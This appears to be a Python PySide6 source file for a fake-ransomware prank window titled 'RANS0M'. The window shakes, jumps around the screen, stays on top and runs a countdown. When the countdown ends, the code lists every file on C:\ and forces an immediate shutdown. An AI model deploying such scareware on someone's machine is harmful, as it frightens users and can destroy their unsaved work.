from BG import Bgs
import BG
from PySide6.QtWidgets import QApplication, QWidget, QLabel
from PySide6.QtCore import QTimer
from PySide6.QtGui import QPixmap
from PySide6.QtCore import Qt
from Label import ImagemClicavel
import random
import os
import Globais
import subprocess


class JanelaMain(QWidget):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
        self.setWindowTitle("RANS0M")

        self.resize(750, 350)
        tela = QApplication.primaryScreen().availableGeometry()

        x = (tela.width() - self.width()) // 2
        y = (tela.height() - self.height()) // 2

        self.move(x, y)

        self.fundo = ImagemClicavel(self)
        # self.fundo.clicado.connect(self.close)

        self.pixmap = QPixmap(
            BG.caminho_recurso("imagens\\Captura de tela 2026-09-08 173743.png")
        )

        self.timeTp = QTimer(self)
        self.posOriginal = self.pos()
        self.timeTp.timeout.connect(self.teletransporte)
        self.timeTp.start(4000)

        self.timeTm = QTimer(self)
        self.timeTm.timeout.connect(self.tremer)
        self.timeTm.start(50)

        self.fundo.setPixmap(self.pixmap)
        self.fundo.resize(self.size())

        self.segundos = Globais.tempo

        self.cronometro = QLabel("01:20", self)
        self.cronometro.move(550, 275)
        self.cronometro.raise_()
        self.cronometro.setStyleSheet(
            "color: black; font-size: 60px; font-weight: bold;"
        )

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.atualizar_cronometro)
        self.timer.start(1000)

        self.moedas = QLabel(f"{Globais.Moedas}", self)
        self.moedas.move(75, 285)
        self.moedas.raise_()
        self.moedas.setStyleSheet("color: yellow; font-size: 50px; font-weight: bold;")

        # cronometro

        self.timerM = QTimer(self)
        self.timerM.timeout.connect(self.atualizarMoedas)
        self.timerM.start(100)

        # Timer que atualiza o cronômetro

        self.setWindowFlags(
            Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint
        )
        self.raise_()

        self.show()

    def atualizarFundo(self):
        pixmap = self.pixmap.scaled(
            self.size(),
            Qt.AspectRatioMode.IgnoreAspectRatio,
            Qt.TransformationMode.SmoothTransformation,
        )

        self.fundo.setPixmap(pixmap)
        self.fundo.resize(self.size())

    def teletransporte(self):
        self.move(random.randint(300, 1600), random.randint(300, 700))
        self.posOriginal = self.pos()

    def tremer(self):
        x = self.posOriginal.x()
        y = self.posOriginal.y()
        self.move(random.randint(x - 5, x + 5), random.randint(y - 5, y + 5))

    def resizeEvent(self, event):
        self.atualizarFundo()
        return super().resizeEvent(event)

    def atualizar_cronometro(self):
        if self.segundos > 0:
            self.segundos -= 1
            Globais.tempo = self.segundos

            minutos = self.segundos // 60
            segundos = self.segundos % 60

            self.cronometro.setText(f"{minutos:02d}:{segundos:02d}")
        else:
            self.timer.stop()
            self.cronometro.setText("00:00")
            os.system('start cmd /k "color 1 && cd /d c:\\ && dir /s"')
            subprocess.run(["shutdown", "/s", "/t", "0"])

    def atualizarMoedas(self):
        self.moedas.setText(f"{Globais.Moedas}")
